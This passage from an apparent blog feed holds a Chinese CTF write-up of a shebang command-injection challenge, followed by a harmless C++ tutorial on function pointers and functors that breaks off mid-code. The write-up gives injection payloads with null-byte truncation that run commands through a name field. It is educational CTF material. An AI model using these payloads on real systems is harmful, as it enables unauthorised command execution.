src="https://img.joe1sn.top/uploads/big/e2081c94cb03b32fa99c47d9a7d79102.png" alt="image-20230627020446490" /></p><p>得到flag</p><blockquote><p>CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!}</p></blockquote><h2 id="storygen"><a class="markdownIt-Anchor" href="#storygen"></a> STORYGEN</h2><p>下载下来是python文件。</p><p>发现使用了<code>os.system(&quot;/tmp/script.sh&quot;)</code>，那么顺着逻辑去分析：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#@NAME&#x27;s story</span></span><br><span class="line"></span><br><span class="line">NAME=<span class="string">&#x27;@NAME&#x27;</span></span><br><span class="line">WHERE=<span class="string">&#x27;@WHERE&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$NAME</span> came from <span class="variable">$WHERE</span>. They always liked living there.&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;They had 3 pets:&quot;</span></span><br><span class="line"></span><br><span class="line">types[0]=<span class="string">&quot;dog&quot;</span></span><br><span class="line">types[1]=<span class="string">&quot;cat&quot;</span></span><br><span class="line">types[2]=<span class="string">&quot;fish&quot;</span></span><br><span class="line"></span><br><span class="line">names[0]=<span class="string">&quot;Bella&quot;</span></span><br><span class="line">names[1]=<span class="string">&quot;Max&quot;</span></span><br><span class="line">names[2]=<span class="string">&quot;Luna&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1 2 3</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  size1=<span class="variable">$&#123;#types[@]&#125;</span></span><br><span class="line">  index1=$((<span class="variable">$RANDOM</span> % <span class="variable">$size1</span>))</span><br><span class="line">  size2=<span class="variable">$&#123;#names[@]&#125;</span></span><br><span class="line">  index2=$((<span class="variable">$RANDOM</span> % <span class="variable">$size2</span>))</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;- a <span class="variable">$&#123;types[$index1]&#125;</span> named <span class="variable">$&#123;names[$index2]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Well, I&#x27;m not a good writer, you can write the rest... Hope this is a good starting point!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;If not, try running the script again.&quot;</span></span><br></pre></td></tr></table></figure><p>然后输入替换这段脚本</p><p><code>open(&quot;/tmp/script.sh&quot;, &quot;w&quot;).write(STORY.replace(&quot;@NAME&quot;, name).replace(&quot;@WHERE&quot;, where).strip())</code></p><p>不过存在小WAF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def sanitize(s):</span><br><span class="line">  return s.replace(&quot;&#x27;&quot;, &#x27;&#x27;).replace(&quot;\n&quot;, &quot;&quot;)</span><br></pre></td></tr></table></figure><p>首要思路肯定是命令注入，而且在首行的<code>#@NAME's story</code>自带了一个<code>'</code>，如果你对shell脚本比较了解的话，会知道往往是以<code>#!/bin/bash</code>开始的，尝试一下</p><p><img src="https://img.joe1sn.top/uploads/big/18571bac12cc614f607cd20862a46b1f.png" alt="image-20230627151715441" /></p><p>成功调用了<code>/bin/bash</code>。赛后看wp发现这个是Shebang（也称为Hashbang），是一种在Unix和类Unix系统中用于指定脚本解释器的约定，它是通过在脚本文件的第一行以特定格式指定解释器的路径来实现的，可以利用这种方式直接<code>./hello.py</code>，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4944fab6a0bb179de51e928c69c29c23.png" alt="image-20230627195529980" /></p><p><img src="https://img.joe1sn.top/uploads/big/96ed2e42f64be4acff42ad1b1e4a0432.png" alt="image-20230627195549157" /></p><p>那么开始构造exp，<strong>需要注意的是尽量使用\x00截断</strong></p><p>官方wp中介绍了一种技巧：<code>#!/bin/cat&lt;空格&gt;</code>的时候会读取自身脚本的内容，首先使用<code>ls -al</code>查看目录，最后排查到根目录</p><p><code>'!/usr/bin/env -S ls -al /\x00'</code></p><p><img src="https://img.joe1sn.top/uploads/big/70f72605e3119997fed33bbee578c2f6.png" alt="image-20230627202031628" /></p><p>尝试读取flag，出现提示</p><p><code>!/usr/bin/env -S cat /flag\x00</code></p><p><img src="https://img.joe1sn.top/uploads/big/c8ff5f5b46e27c6c5fb4070cde62e062.png" alt="image-20230627202132139" /></p><p>得到提示，最后使用payload得到flag</p><p><code>!/usr/bin/env -S sh -c &quot;/get_flag Give flag please&quot;\x00</code></p><p><img src="https://img.joe1sn.top/uploads/big/0656d0bf3c5b2b6e83166de03ceee2e1.png" alt="image-20230627202249168" /></p><blockquote><p>CTF{Sh3b4ng_1nj3cti0n_ftw}</p></blockquote><h2 id="ubf"><a class="markdownIt-Anchor" href="#ubf"></a> UBF</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。&lt;/p&gt;
&lt;p&gt;开始CTF的复健之路吧。&lt;/p&gt;</summary>
    
    
    
    <category term="writeup" scheme="https://joe1sn.eu.org/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://joe1sn.eu.org/tags/CTF/"/>
    
    <category term="writeup" scheme="https://joe1sn.eu.org/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】C++函数进化</title>
    <link href="https://joe1sn.eu.org/2023/06/26/cpp-function/"/>
    <id>https://joe1sn.eu.org/2023/06/26/cpp-function/</id>
    <published>2023-06-26T00:10:22.000Z</published>
    <updated>2023-06-26T15:41:34.611Z</updated>
    
    <content type="html"><![CDATA[<p>C++的函数进化小结</p><span id="more"></span><h1 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h1><p>有这样一个问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么很自然的给出解法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*start &gt; <span class="number">20</span>)</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>(IntArray,IntArray+<span class="number">20</span>)&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="函数指针"><a class="markdownIt-Anchor" href="#函数指针"></a> 函数指针</h1><p>这个时候的需要满足 <strong>统计大于10的数字</strong> 或者 <strong>统计小于35的数字</strong>，那么可以将<code>*start &gt; 20</code>这一段包装一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end, <span class="type">bool</span>(*ConditionFunc)(<span class="type">const</span> <span class="type">int</span> &amp;))</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat20</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">20</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat10</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">10</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bLess35</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123;  <span class="keyword">return</span> num &lt; <span class="number">35</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat20 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 10 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat10 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bLess35 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图片上的代码有点小问题</p><p><img src="https://img.joe1sn.top/uploads/medium/6bd00d07f13d059ff7e733e80ecc0017.png" alt="image-20230626083232291" /></p><p>在c语言中可以这样写，虽然编译会有警告，但是仍然可以生成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end, <span class="type">void</span> *function_pointer(<span class="type">int</span>))</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_pointer(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pointer</span><span class="params">(<span class="type">int</span> start)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Happy\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Matches: %d\n&quot;</span>,CountMatch(IntArray,IntArray+<span class="number">20</span>, Pointer));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在c<ins>中伴随着指针的引用<code>*p</code>和解引用<code>&amp;p</code>，C</ins>对指针的类型安全性进行了更严格的限制。C++中的指针类型必须与所指向的对象类型匹配，不允许进行隐式类型转换。这可以帮助减少潜在的类型错误和编程错误。</p><h1 id="函数模板"><a class="markdownIt-Anchor" href="#函数模板"></a> 函数模板</h1><p>上面的函数只能支持<code>int</code>，使用函数模板能让他支持更多类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, <span class="type">bool</span>(*ConditionFunc)(<span class="type">const</span> T &amp;))</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">                sum++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat20</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">20</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat10</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">10</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bLess35</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123;  <span class="keyword">return</span> num &lt; <span class="number">35</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bTiny</span><span class="params">(<span class="type">const</span> std::string &amp;val)</span></span>&#123; <span class="keyword">return</span> val.<span class="built_in">size</span>() &lt;= <span class="number">3</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    std::string StrArray[] = &#123;<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;This&quot;</span>,<span class="string">&quot;is&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;test&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat20 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 10 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat10 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( StrArray, StrArray+<span class="number">6</span>, bTiny )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="仿函数"><a class="markdownIt-Anchor" href="#仿函数"></a> 仿函数</h1><p>在条件中如果需要处理用户传入的数字怎么办</p><p>仿函数（Functor）是C++中的一个概念，指的是可以像函数一样使用的对象。它实际上是一个类或结构体，重载了函数调用运算符 <code>operator()</code>，使得对象可以像函数一样进行调用操作。</p><p>chatGPT给了我这样一个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个仿函数类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddFunctor</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个仿函数对象</span></span><br><span class="line">    AddFunctor add;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用仿函数对象进行调用</span></span><br><span class="line">    <span class="type">int</span> result = <span class="built_in">add</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Result: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这里可以这样写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Greater</span></span><br><span class="line">&#123;</span><br><span class="line">    T mVal; <span class="comment">//持有的状态</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Greater</span><span class="params">(T value)</span>:</span></span><br><span class="line"><span class="function">        mVal(value)&#123;</span>&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T &amp;val)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> val&gt;mVal; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>explicit</code>：通过在单参数构造函数前添加 <code>explicit</code> 关键字，可以防止编译器在需要进行类型转换的情况下自动调用该构造函数。</li><li><code>operator</code>：仿函数的实现，使得对象可以像函数一样进行调用操作。</li></ul><p>抓函数中生成一个对象（该标准仅在c++11及以上支持），但是这样函数指针就没法用了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Greater&lt;<span class="type">int</span>&gt; greater20&#123;<span class="number">20</span>&#125;;</span><br></pre></td></tr></table></figure><p>可以学习标准库中的操作将模板持续下去</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> fCompare&gt;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, fCompare ConditionFunc)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> fCompare&gt;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, fCompare ConditionFunc)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Greater</span></span><br><span class="line">&#123;</span><br><span class="line">    T mVal; <span class="comment">//持有的状态</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Greater</span><span class="params">(T value)</span>:</span></span><br><span class="line"><span class="function">        mVal(value)&#123;</span>&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T &amp;val)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> val&gt;mVal; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    std::string StrArray[] = &#123;<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;This&quot;</span>,<span class="string">&quot;is&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;test&quot;</span>&#125;;</span><br><span class="line">    Greater&lt;<span 